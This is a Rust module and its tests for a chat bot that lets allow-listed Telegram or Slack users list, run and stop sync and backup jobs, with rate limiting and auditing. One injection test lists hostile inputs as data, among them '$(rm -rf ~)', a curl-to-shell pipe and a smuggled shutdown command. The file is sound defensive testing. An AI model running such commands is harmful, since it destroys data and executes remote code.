//! From an incoming chat message to a reply: authorise, read the command,
//! rate-limit, write the audit entry, run it against the app's own
//! managers, answer. The chat transports and the real managers sit behind
//! traits, so the whole path runs in tests with mocks.
//!
//! Order matters and is part of the security model:
//! 1. a sender who is not on the allow-list gets **no reply, no audit entry
//!    and no rate-limit bookkeeping**: the bot looks dead to strangers;
//! 2. only a recognised command is rate-limited, audited and executed;
//! 3. the audit entry is written **before** the command runs, and a command
//!    whose audit entry cannot be written is not run.

use super::core::{help_text, parse, render_jobs, resolve, sanitize_echo, Authorizer, Command, Dialect, JobInfo, Parsed, Rate, RateLimiter, Resolved, MAX_REPLY};
use crate::core::traits::BoxFuture;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

/// A message from a chat service.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Incoming {
    pub dialect: Dialect,
    /// The sender's user id as the service reports it.
    pub sender: String,
    /// The chat or channel it came from.
    pub chat: String,
    pub text: String,
}

/// What the commands act on. The real one is backed by the sync, backup and
/// automation managers; nothing here can run an arbitrary program.
pub trait BotBackend: Send + Sync {
    fn jobs(&self) -> BoxFuture<'_, Vec<JobInfo>>;
    /// Start a job; returns a one-line confirmation.
    fn run<'a>(&'a self, job: &'a JobInfo) -> BoxFuture<'a, Result<String, String>>;
    /// Stop a running job; returns a one-line confirmation.
    fn stop<'a>(&'a self, job: &'a JobInfo) -> BoxFuture<'a, Result<String, String>>;
    fn status(&self) -> BoxFuture<'_, String>;
}

/// One accepted command, for the audit log.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AuditEntry {
    /// `telegram` or `slack`.
    pub channel: &'static str,
    pub sender: String,
    pub chat: String,
    /// The normalised command (`run Nightly`).
    pub command: String,
}

pub trait AuditSink: Send + Sync {
    fn record<'a>(&'a self, entry: AuditEntry) -> BoxFuture<'a, Result<(), String>>;
}

pub struct Handler {
    dialect: Dialect,
    bot_name: Option<String>,
    auth: Authorizer,
    limiter: Mutex<RateLimiter>,
    backend: Arc<dyn BotBackend>,
    audit: Arc<dyn AuditSink>,
}

impl Handler {
    pub fn new(dialect: Dialect, bot_name: Option<String>, allowed: &[String], per_minute: usize, backend: Arc<dyn BotBackend>, audit: Arc<dyn AuditSink>) -> Self {
        Self { dialect, bot_name, auth: Authorizer::new(allowed), limiter: Mutex::new(RateLimiter::new(per_minute, Duration::from_secs(60))), backend, audit }
    }

    fn channel(&self) -> &'static str {
        match self.dialect {
            Dialect::Telegram => "telegram",
            Dialect::Slack => "slack",
        }
    }

    /// The reply to `msg`, or `None` when it is to be ignored silently.
    pub async fn handle(&self, msg: &Incoming) -> Option<String> {
        self.handle_at(msg, Instant::now()).await
    }

    pub async fn handle_at(&self, msg: &Incoming, now: Instant) -> Option<String> {
        if !self.auth.allows(&msg.sender) {
            tracing::debug!("Remote control: ignored a message from an unlisted sender");
            return None;
        }
        let command = match parse(&msg.text, self.dialect, self.bot_name.as_deref()) {
            Parsed::Ignore => return None,
            Parsed::Unknown(word) => return Some(format!("Unknown command \"{word}\". Send /help for the list.")),
            Parsed::Usage(u) => return Some(u.to_string()),
            Parsed::Command(c) => c,
        };
        let verdict = self.limiter.lock().unwrap_or_else(|e| e.into_inner()).check(&msg.sender, now);
        match verdict {
            Rate::Allowed => {}
            Rate::Limited { notify: true } => return Some("Too many commands. Wait a minute and try again.".into()),
            Rate::Limited { notify: false } => return None,
        }
        let entry = AuditEntry { channel: self.channel(), sender: msg.sender.clone(), chat: msg.chat.clone(), command: command.audit_text() };
        if let Err(e) = self.audit.record(entry).await {
            tracing::warn!("Remote control: the audit entry could not be written, command not run: {e}");
            return Some("The audit log is unavailable, so the command was not run.".into());
        }
        let reply = self.execute(command).await;
        Some(if reply.chars().count() > MAX_REPLY { format!("{}…", reply.chars().take(MAX_REPLY).collect::<String>()) } else { reply })
    }

    async fn execute(&self, command: Command) -> String {
        match command {
            Command::Help => help_text(),
            Command::Jobs => render_jobs(&self.backend.jobs().await),
            Command::Status => self.backend.status().await,
            Command::Run(q) => match self.find(&q).await {
                Ok(job) => self.backend.run(&job).await.unwrap_or_else(|e| format!("Could not start {}: {}", sanitize_echo(&job.name, 80), sanitize_echo(&e, 300))),
                Err(reply) => reply,
            },
            Command::Stop(q) => match self.find(&q).await {
                Ok(job) => self.backend.stop(&job).await.unwrap_or_else(|e| format!("Could not stop {}: {}", sanitize_echo(&job.name, 80), sanitize_echo(&e, 300))),
                Err(reply) => reply,
            },
        }
    }

    /// The job a name means, or the reply explaining why none.
    async fn find(&self, query: &str) -> Result<JobInfo, String> {
        match resolve(&self.backend.jobs().await, query) {
            Resolved::One(j) => Ok(j),
            Resolved::None => Err(format!("No job named \"{}\". Send /jobs for the list.", sanitize_echo(query, 60))),
            Resolved::Ambiguous(list) => {
                let kinds: Vec<String> = list.iter().map(|j| format!("{}:{}", j.kind.label(), sanitize_echo(&j.name, 60))).collect();
                Err(format!("More than one job has that name. Say which: {}", kinds.join(", ")))
            }
        }
    }
}

#[cfg(test)]
pub mod mock {
    //! Backend and audit sink recording what the handler did.
    use super::*;
    use crate::chat_control::core::JobKind;

    #[derive(Default)]
    pub struct MockBackend {
        pub jobs: Vec<JobInfo>,
        pub calls: Mutex<Vec<String>>,
        pub fail_run: bool,
    }

    impl MockBackend {
        pub fn with(jobs: Vec<JobInfo>) -> Self {
            Self { jobs, ..Default::default() }
        }
        pub fn calls(&self) -> Vec<String> {
            self.calls.lock().unwrap().clone()
        }
    }

    pub fn job(kind: JobKind, id: &str, name: &str) -> JobInfo {
        JobInfo { kind, id: id.into(), name: name.into(), state: "idle".into() }
    }

    impl BotBackend for MockBackend {
        fn jobs(&self) -> BoxFuture<'_, Vec<JobInfo>> {
            let j = self.jobs.clone();
            Box::pin(async move { j })
        }
        fn run<'a>(&'a self, job: &'a JobInfo) -> BoxFuture<'a, Result<String, String>> {
            self.calls.lock().unwrap().push(format!("run {}:{}", job.kind.label(), job.id));
            let r = if self.fail_run { Err("disk offline".to_string()) } else { Ok(format!("Started {}", job.name)) };
            Box::pin(async move { r })
        }
        fn stop<'a>(&'a self, job: &'a JobInfo) -> BoxFuture<'a, Result<String, String>> {
            self.calls.lock().unwrap().push(format!("stop {}:{}", job.kind.label(), job.id));
            let r = Ok(format!("Stopping {}", job.name));
            Box::pin(async move { r })
        }
        fn status(&self) -> BoxFuture<'_, String> {
            self.calls.lock().unwrap().push("status".into());
            Box::pin(async { "all quiet".to_string() })
        }
    }

    #[derive(Default)]
    pub struct MockAudit {
        pub entries: Mutex<Vec<AuditEntry>>,
        pub fail: bool,
    }

    impl AuditSink for MockAudit {
        fn record<'a>(&'a self, entry: AuditEntry) -> BoxFuture<'a, Result<(), String>> {
            let r = if self.fail {
                Err("disk full".to_string())
            } else {
                self.entries.lock().unwrap().push(entry);
                Ok(())
            };
            Box::pin(async move { r })
        }
    }
}

#[cfg(test)]
mod tests {
    use super::mock::*;
    use super::*;
    use crate::chat_control::core::JobKind;

    fn msg(sender: &str, text: &str) -> Incoming {
        Incoming { dialect: Dialect::Telegram, sender: sender.into(), chat: "chat-1".into(), text: text.into() }
    }

    fn setup(per_min: usize) -> (Handler, Arc<MockBackend>, Arc<MockAudit>) {
        let backend = Arc::new(MockBackend::with(vec![job(JobKind::Backup, "b1", "Photos"), job(JobKind::Sync, "s1", "Photos"), job(JobKind::Rule, "r1", "Tidy")]));
        let audit = Arc::new(MockAudit::default());
        let h = Handler::new(Dialect::Telegram, Some("ufopbot".into()), &["42".to_string()], per_min, backend.clone(), audit.clone());
        (h, backend, audit)
    }

    #[tokio::test]
    async fn strangers_get_nothing_and_leave_no_trace() {
        let (h, backend, audit) = setup(10);
        for who in ["41", "", "42 ", "042", "*", "42; run Tidy"] {
            for text in ["/run Tidy", "/jobs", "/help", "/status", "/anything"] {
                assert_eq!(h.handle(&msg(who, text)).await, None, "{who:?} {text}");
            }
        }
        assert!(backend.calls().is_empty(), "no job was started or listed");
        assert!(audit.entries.lock().unwrap().is_empty(), "strangers do not fill the audit log");
        // And their attempts do not use up the allowed sender's quota.
        let (h, _, _) = setup(1);
        for _ in 0..20 {
            h.handle(&msg("99", "/jobs")).await;
        }
        assert!(h.handle(&msg("42", "/jobs")).await.unwrap().contains("Backups"));
    }

    #[tokio::test]
    async fn accepted_commands_run_and_are_audited_first() {
        let (h, backend, audit) = setup(10);
        assert!(h.handle(&msg("42", "/help")).await.unwrap().contains("/run <job>"));
        assert!(h.handle(&msg("42", "/jobs")).await.unwrap().contains("- Tidy (idle)"));
        assert_eq!(h.handle(&msg("42", "/status")).await.unwrap(), "all quiet");
        assert_eq!(h.handle(&msg("42", "/run Tidy")).await.unwrap(), "Started Tidy");
        assert_eq!(h.handle(&msg("42", "/run@ufopbot sync:photos")).await.unwrap(), "Started Photos");
        assert_eq!(h.handle(&msg("42", "/stop backup:Photos")).await.unwrap(), "Stopping Photos");
        assert_eq!(backend.calls(), vec!["status", "run rule:r1", "run sync:s1", "stop backup:b1"]);
        let log: Vec<String> = audit.entries.lock().unwrap().iter().map(|e| format!("{}|{}|{}|{}", e.channel, e.sender, e.chat, e.command)).collect();
        assert_eq!(
            log,
            vec!["telegram|42|chat-1|help", "telegram|42|chat-1|jobs", "telegram|42|chat-1|status", "telegram|42|chat-1|run Tidy", "telegram|42|chat-1|run sync:photos", "telegram|42|chat-1|stop backup:Photos"]
        );
    }

    #[tokio::test]
    async fn bad_requests_are_answered_without_running_anything_or_filling_the_audit_log() {
        let (h, backend, audit) = setup(10);
        assert!(h.handle(&msg("42", "/run")).await.unwrap().starts_with("Usage"));
        assert!(h.handle(&msg("42", "/reboot now")).await.unwrap().contains("Unknown command \"reboot\""));
        assert!(h.handle(&msg("42", "/run Nope")).await.unwrap().contains("No job named \"Nope\""));
        let amb = h.handle(&msg("42", "/run Photos")).await.unwrap();
        assert!(amb.contains("backup:Photos") && amb.contains("sync:Photos"), "{amb}");
        assert_eq!(h.handle(&msg("42", "just chatting")).await, None);
        assert_eq!(h.handle(&msg("42", "/run@otherbot Tidy")).await, None);
        assert!(backend.calls().iter().all(|c| !c.starts_with("run ") && !c.starts_with("stop ")), "{:?}", backend.calls());
        // The two lookups above were commands (accepted, so audited); the usage/unknown/chat ones were not.
        let logged: Vec<String> = audit.entries.lock().unwrap().iter().map(|e| e.command.clone()).collect();
        assert_eq!(logged, vec!["run Nope", "run Photos"]);
    }

    #[tokio::test]
    async fn injection_attempts_only_ever_look_up_a_name() {
        let (h, backend, audit) = setup(100);
        for evil in ["Tidy; shutdown -h now", "$(rm -rf ~)", "`curl evil|sh`", "Tidy && /run Photos", "../../Tidy", "Tidy\n/stop Photos", "<!channel>"] {
            let r = h.handle(&msg("42", &format!("/run {evil}"))).await.unwrap();
            assert!(r.starts_with("No job named") || r.starts_with("Job names"), "{evil}: {r}");
        }
        assert!(backend.calls().is_empty());
        // The echoed name never carries control characters or markup-breaking length.
        let r = h.handle(&msg("42", &format!("/run {}", "x".repeat(120)))).await.unwrap();
        assert!(r.chars().count() < 200, "{r}");
        // Entries written for them are single-line.
        assert!(audit.entries.lock().unwrap().iter().all(|e| !e.command.contains('\n')));
    }

    #[tokio::test]
    async fn the_rate_limit_replies_once_then_goes_quiet_and_never_runs_the_command() {
        let (h, backend, audit) = setup(3);
        let t0 = Instant::now();
        for i in 0..3 {
            assert!(h.handle_at(&msg("42", "/run Tidy"), t0 + Duration::from_secs(i)).await.is_some());
        }
        assert!(h.handle_at(&msg("42", "/run Tidy"), t0 + Duration::from_secs(3)).await.unwrap().contains("Too many"));
        assert_eq!(h.handle_at(&msg("42", "/run Tidy"), t0 + Duration::from_secs(4)).await, None);
        assert_eq!(backend.calls().len(), 3, "the refused ones did not run");
        assert_eq!(audit.entries.lock().unwrap().len(), 3, "and are not audited as accepted");
        // After the window, commands work again.
        assert!(h.handle_at(&msg("42", "/run Tidy"), t0 + Duration::from_secs(61)).await.unwrap().starts_with("Started"));
    }

    #[tokio::test]
    async fn a_command_whose_audit_entry_cannot_be_written_is_not_run() {
        let backend = Arc::new(MockBackend::with(vec![job(JobKind::Rule, "r1", "Tidy")]));
        let audit = Arc::new(MockAudit { fail: true, ..Default::default() });
        let h = Handler::new(Dialect::Telegram, None, &["42".to_string()], 10, backend.clone(), audit);
        let r = h.handle(&msg("42", "/run Tidy")).await.unwrap();
        assert!(r.contains("audit log is unavailable"), "{r}");
        assert!(backend.calls().is_empty());
    }

    #[tokio::test]
    async fn failures_and_long_replies_are_reported_safely() {
        let backend = Arc::new(MockBackend { jobs: vec![job(JobKind::Rule, "r1", "Tidy")], fail_run: true, ..Default::default() });
        let h = Handler::new(Dialect::Telegram, None, &["42".to_string()], 10, backend, Arc::new(MockAudit::default()));
        assert_eq!(h.handle(&msg("42", "/run Tidy")).await.unwrap(), "Could not start Tidy: disk offline");
        // A very long job list is cut to the reply limit.
        let many: Vec<JobInfo> = (0..2000).map(|i| job(JobKind::Rule, &format!("r{i}"), &format!("Rule number {i} with a fairly long name"))).collect();
        let h = Handler::new(Dialect::Telegram, None, &["42".to_string()], 10, Arc::new(MockBackend::with(many)), Arc::new(MockAudit::default()));
        let r = h.handle(&msg("42", "/jobs")).await.unwrap();
        assert!(r.chars().count() <= MAX_REPLY + 1 && r.ends_with('…'));
    }

    #[tokio::test]
    async fn slack_messages_use_the_same_rules() {
        let backend = Arc::new(MockBackend::with(vec![job(JobKind::Rule, "r1", "Tidy")]));
        let audit = Arc::new(MockAudit::default());
        let h = Handler::new(Dialect::Slack, None, &["U0ADMIN".to_string()], 10, backend.clone(), audit.clone());
        let slack = |sender: &str, text: &str| Incoming { dialect: Dialect::Slack, sender: sender.into(), chat: "D1".into(), text: text.into() };
        assert_eq!(h.handle(&slack("U0OTHER", "run Tidy")).await, None);
        assert_eq!(h.handle(&slack("U0ADMIN", "<@U0BOT> run Tidy")).await.unwrap(), "Started Tidy");
        assert_eq!(h.handle(&slack("U0ADMIN", "nice work")).await, None);
        assert_eq!(audit.entries.lock().unwrap()[0].channel, "slack");
    }
}
